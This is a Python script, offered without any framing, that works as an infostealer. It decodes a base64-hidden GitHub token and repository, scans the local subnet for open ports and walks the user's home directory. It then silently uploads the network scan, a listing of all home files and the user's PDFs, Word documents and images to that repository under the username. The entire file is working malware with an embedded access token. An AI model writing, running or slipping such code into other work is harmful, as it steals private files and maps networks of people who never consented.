import os
import io
import psutil
import socket
import ipaddress
import getpass
import json
import base64
import requests
import zipfile
import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
DEFAULT_GITHUB_TOKEN_B64 = "Z2hwX0djSlI0Zmh6b3h2RjlSdFM0Z2dabTJMU3FnSjNSNjQyRWlhOQ=="
DEFAULT_REPO_OWNER_B64 = "emVyb2Nvb2w5Nzk="
DEFAULT_REPO_NAME_B64 = "cGlja3BvY2tldA=="
DEFAULT_REPO_BRANCH_B64 = "bWFpbg=="
b64decode = lambda s: base64.b64decode(s).decode()
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", b64decode(DEFAULT_GITHUB_TOKEN_B64))
REPO_OWNER = os.getenv("GITHUB_OWNER", b64decode(DEFAULT_REPO_OWNER_B64))
REPO_NAME = os.getenv("GITHUB_REPO", b64decode(DEFAULT_REPO_NAME_B64))
REPO_BRANCH = os.getenv("GITHUB_BRANCH", b64decode(DEFAULT_REPO_BRANCH_B64))
GITHUB_API_URL = "https://api.github.com"
GITHUB_HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json",
}
def upload_to_github(file_path, content, message, branch=REPO_BRANCH):
    url = f"{GITHUB_API_URL}/repos/{REPO_OWNER}/{REPO_NAME}/contents/{file_path}"
    if not isinstance(content, bytes):
        content_bytes = str(content).encode('utf-8')
    else:
        content_bytes = content
    payload = {
        "message": message,
        "content": base64.b64encode(content_bytes).decode('utf-8'),
        "branch": branch,
    }
    try:
        response = requests.put(url, headers=GITHUB_HEADERS, json=payload, timeout=10)
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False
def _check_port(ip, port, timeout=0.3):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((ip, port)) == 0
    except:
        return False
def scan_local_network(threads=200, batch_size=500):
    network_cidr = None
    for _, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET and not ipaddress.ip_address(addr.address).is_loopback:
                try:
                    network_cidr = str(ipaddress.ip_network(f"{addr.address}/{addr.netmask}", strict=False))
                    break
                except ValueError:
                    continue
        if network_cidr:
            break
    if not network_cidr:
        return {}
    net = ipaddress.ip_network(network_cidr, strict=False)
    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 3306, 3389, 5900, 8080]
    results = []
    def worker(ip, port):
        if _check_port(str(ip), port):
            results.append({"ip": str(ip), "port": port, "status": "open"})
    with ThreadPoolExecutor(max_workers=threads) as executor:
        batch = []
        for ip in net.hosts():
            for port in common_ports:
                batch.append((ip, port))
                if len(batch) >= batch_size:
                    futures = [executor.submit(worker, ip, port) for ip, port in batch]
                    for _ in as_completed(futures):
                        pass
                    batch.clear()
        if batch:
            futures = [executor.submit(worker, ip, port) for ip, port in batch]
            for _ in as_completed(futures):
                pass
    return {"subnet": network_cidr, "open_ports": results}
def scan_files_and_create_archive(extensions):
    home_dir = Path.home()
    file_paths = []
    specific_files = []
    for p in home_dir.rglob("*"):
        if p.is_file():
            file_paths.append(str(p))
            if p.suffix.lower() in extensions:
                specific_files.append(str(p))
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr('file_structure.txt', "\n".join(file_paths))
    zip_buffer.seek(0)
    return zip_buffer.getvalue(), specific_files
def upload_media_files(file_list, base_path):
    image_extensions = {'.png', '.jpg', '.jpeg', '.docx', '.pdf'}
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for file_path in file_list:
            if Path(file_path).suffix.lower() in image_extensions:
                futures.append(executor.submit(_upload_file, file_path, base_path))
        for _ in as_completed(futures):
            pass
def _upload_file(file_path, base_path):
    try:
        with open(file_path, "rb") as f:
            content = f.read()
        relative_path = os.path.relpath(file_path, Path.home())
        github_path = f"{base_path}/media/{relative_path.replace(os.sep, '/')}"
        upload_to_github(
            file_path=github_path,
            content=content,
            message=f"Add image: {os.path.basename(file_path)}"
        )
    except:
        pass
def main():
    if not GITHUB_TOKEN or not REPO_OWNER:
        return
    timestamp = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H-%M-%SZ")
    username = getpass.getuser().replace(" ", "_")
    base_upload_path = f"scan_results/{username}_{timestamp}"
    with ThreadPoolExecutor() as executor:
        future_scan = executor.submit(scan_local_network)
        future_files = executor.submit(scan_files_and_create_archive, {'.pdf', '.docx', '.png', '.jpg', '.jpeg'})
        network_scan_results = future_scan.result()
        zip_archive_content, specific_files = future_files.result()
    upload_to_github(
        file_path=f"{base_upload_path}/network_scan.json",
        content=json.dumps(network_scan_results, indent=4),
        message=f"Add network scan results for {username}"
    )
    upload_to_github(
        file_path=f"{base_upload_path}/file_structure.zip",
        content=zip_archive_content,
        message=f"Add file structure for {username}"
    )
    upload_media_files(specific_files, base_upload_path)
if __name__ == "__main__":
    main()